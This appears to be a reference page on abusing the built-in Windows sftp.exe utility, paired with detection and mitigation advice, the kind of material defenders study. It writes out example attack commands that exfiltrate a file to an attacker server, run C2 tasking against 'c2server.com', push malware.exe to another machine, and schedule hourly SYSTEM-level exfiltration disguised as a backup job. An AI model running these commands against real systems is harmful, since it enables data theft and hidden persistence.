# sftp.exe  
## What is it?  
*```sftp.exe``` (Secure File Transfer Protocol) is a **built-in Windows command-line utility** used for secure file transfers over SSH.* *It allows users to securely upload, download, and manage files on remote systems using encrypted connections.* *Since it is a **trusted Windows binary**, attackers often abuse it for **data exfiltration, persistence, and stealthy C2 communications**.*  

## Legitimate Usage  
- **Secure File Transfers** → Upload/download files between local and remote systems over SSH.  
- **Remote File Management** → List, move, and delete files on an SSH server.  
- **Automation** → Used in scripts for **secure backup and data synchronization**.  

## How to abuse it  
- **Data Exfiltration** → Stealthily transfer stolen files to an attacker-controlled server.  
- **C2 Communication** → Use encrypted SFTP sessions to avoid detection.  
- **Lateral Movement** → Move malicious payloads between compromised systems.  
- **Persistence** → Automate file transfers for continuous data leaks.  

## Example Attacks  
### 1. Data Exfiltration to a Remote Server  
*Attackers use `sftp.exe` to transfer stolen files without detection.*  

```
sftp user@192.168.1.100
put C:\SensitiveData\report.pdf
exit
```

**Effect:**  
- Sends `report.pdf` to a remote attacker-controlled server.  
- Encrypted SSH connection evades **network monitoring tools**.  

### 2. Automated Data Exfiltration via Script  
*Attackers can automate SFTP commands using a batch script.*  

```
echo put C:\SensitiveData\report.pdf > C:\Windows\Temp\sftp_commands.txt  
sftp -b C:\Windows\Temp\sftp_commands.txt user@192.168.1.100  
```

**Effect:**
- Reads commands from `sftp_commands.txt` and executes them.
- Avoids interactive prompts for **silent exfiltration**.

### 3. Using SFTP for C2 Communication
*Attackers can use SFTP to upload/download commands and tools without triggering alerts.*

```
sftp attacker@c2server.com  
get tasks.txt  
put results.txt  
exit
```

**Effect:**
- Downloads **new attack instructions** from `tasks.txt`.
- Uploads **execution results** to `results.txt`.
- **Evades traditional C2 detection methods**.

### 4. Lateral Movement via SFTP
*Attackers move payloads between compromised machines.*

```
sftp user@192.168.1.50  
put malware.exe  
exit  
```

**Effect:**
- Places `malware.exe` on `192.168.1.50` for execution.
- **Uses encrypted SFTP to evade file transfer monitoring**.

### 5. Persistence via Scheduled SFTP Transfers
Attackers can exfiltrate files at regular intervals.

```
schtasks /create /tn "BackupJob" /tr "sftp -b C:\Windows\Temp\sftp_commands.txt user@192.168.1.100" /sc hourly /ru SYSTEM  
```

**Effect:**
- Runs SFTP **every hour**, ensuring **continuous data theft**.
- **Blends into legitimate scheduled backup jobs**.

# Detection & Mitigation
## Detection Methods
- **Monitor SFTP Connections** → Analyze SSH traffic for unauthorized file transfers.
- **Detect Unusual File Transfers** → Look for high-volume outbound data transfers.
- **Audit Scheduled Tasks** → Identify automated exfiltration attempts.

## Mitigation Strategies
- **Restrict SFTP Access** → Limit use to trusted users and servers.
- **Block Unauthorized SSH Traffic** → Use firewall rules to prevent outbound SSH to unknown servers.
- **Monitor File Access Logs** → Detect suspicious file movements before exfiltration.
